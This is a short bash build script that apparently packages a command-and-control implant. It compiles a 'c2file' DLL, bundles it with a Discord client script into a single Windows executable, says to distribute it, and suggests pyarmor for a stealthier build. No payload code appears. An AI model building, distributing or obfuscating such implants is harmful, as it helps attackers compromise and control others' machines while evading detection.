#!/bin/bash
/usr/bin/x86_64-w64-mingw32-gcc -shared c2file_dll.c -o c2file.dll
wine "C:\\Program Files\\Python312\\python.exe" -m PyInstaller --target-architecture amd64 --onefile -F --add-binary "c2file.dll;." discord_client.py
echo '[=] Complete. Distribute dist/discord_client.exe to clients as required.'
echo '-----------------------'
echo '|        NOTE         |'
echo '----------------------'
echo 'This is compiled unobfuscated. To create a more stealthy version, use: pyarmor'